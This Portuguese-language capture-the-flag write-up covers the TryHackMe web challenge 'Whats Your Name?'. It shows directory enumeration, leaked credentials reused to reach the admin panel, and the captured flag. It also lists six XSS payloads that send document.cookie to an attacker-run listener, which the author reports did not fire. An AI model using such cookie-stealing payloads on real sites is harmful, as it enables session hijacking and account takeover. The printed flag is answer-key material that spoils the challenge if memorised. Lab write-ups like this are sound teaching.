# [Whats Your Name?]
###### Resolvido por @SebastiaoKomada  
> Desafio: WEB

---

### Sobre o desafio  
Descrição do desafio: *"Never click on links received from unknown sources. Can you capture the flags and get admin access to the web app?"*

Lendo a descrição, percebemos que o objetivo é encontrar uma forma de acessar tanto a conta de **admin** quanto a de **moderador**, já que o desafio possui duas flags:

```
What is the flag value after accessing the moderator account?
What is the flag value after accessing the admin panel?
```

---

## Solução

O primeiro passo é configurar em `/etc/hosts` o IP fornecido pelo TryHackMe apontando para os domínios usados no desafio:

```
10.65.169.250 worldwap.thm login.worldwap.thm
```

(Obs.: estou conectado via **OpenVPN**, necessário para acessar a máquina do desafio.)

Ao acessar o site principal, temos a seguinte página:

<img width="1168" height="801" alt="image" src="https://github.com/user-attachments/assets/4b72d5a9-54b1-4dd7-a372-269ea3b2bd8f" />

Analisando o código-fonte, não encontramos muita coisa além da existência da página de registro. Após tentar criar uma conta, o sistema retorna:

<img width="1194" height="803" alt="image" src="https://github.com/user-attachments/assets/e393347c-9df7-44ae-97b7-bfec6febc75d" />

Porém, ao tentar fazer login, recebemos `User not verified.` e uma instrução adicional:

```
You need to visit login.worldwap.thm to login once you register successfully
```

Isso sugere que o login deve ser feito no segundo domínio: **login.worldwap.thm**.

Como o site não apresenta outras páginas relevantes, utilizei o **Gobuster** para enumerar diretórios:

```
gobuster dir -u http://worldwap.thm/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,py
```

<img width="812" height="703" alt="image" src="https://github.com/user-attachments/assets/64a7ce21-7998-422d-8b64-e7080ee094d0" />

Entre os resultados, encontramos um arquivo suspeito (`4.py`). Abrindo-o, descobrimos credenciais:

```
username_input.send_keys("moderator")
password_input.send_keys("Un6u3$$4Bl3!!")
```

Tentando fazer login no domínio correto, primeiro usando **moderator**, recebemos erro. Porém, ao testar **admin** com a mesma senha, conseguimos acesso — e, com isso, a segunda flag:

<img width="1919" height="917" alt="image" src="https://github.com/user-attachments/assets/39a3dcea-6eae-44da-b6f6-3e7e9d1218ce" />

Analisando os cookies, observamos que o sistema utiliza **PHPSESSION**, indicando que a autenticação depende do cookie de sessão.

Agora que já conseguimos a flag de admin, falta acessar o perfil **moderador**.

Como o Gobuster não revelou mais nada útil, voltamos a analisar os mecanismos do site. A própria descrição do desafio indica:

```
This challenge will test client-side exploitation skills, 
from inspecting Javascript to manipulating cookies to launching CSRF/XSS attacks.
```

Ou seja, provavelmente precisamos manipular o fluxo do registro usando XSS ou modificação do cookie.

---

## Tentativa de exploração via XSS

Como o registro envolve envio de dados ao cliente, testei injeções XSS para capturar cookies. Para isso, subi um servidor local:

```
python -m http.server 1234
```

O objetivo é fazer o navegador do sistema alvo requisitar meu servidor, enviando o cookie da vítima.

Testei algumas payloads comuns:

```
<script>new Image().src='http://localhost:1234/?c='+document.cookie</script>
<img src=x onerror="fetch('http://localhost:1234/?c='+document.cookie)">
<img src=x onerror="new Image().src='http://localhost:1234/?c='+document.cookie">
<img src=x onerror="var x=new XMLHttpRequest();x.open('GET','http://localhost:1234/?c='+document.cookie);x.send()">
<img src=x onerror="navigator.sendBeacon('http://localhost:1234/', document.cookie)">
<img src=x onerror="window.location='http://localhost:1234/?'+document.cookie;">
```
(Obs.: em localhost, deve-se passar o endereco do ip correto da maquina conectada.)
Porém, nenhuma delas resultou em requisições ao meu servidor — indicando que o campo pode estar sanitizando entradas ou que o XSS ocorre em outro ponto do fluxo.

---

## Flag encontrada  
**Flag:**  
**Flag:**  `AdM!nP@wnEd`

---

## Possível desenvolvimento

Se fosse possível capturar o cookie de sessão do perfil **moderador**, bastaria injetá-lo manualmente em **login.worldwap.thm** para assumir a sessão e revelar a flag. Assim como ocorreu com a conta de admin.
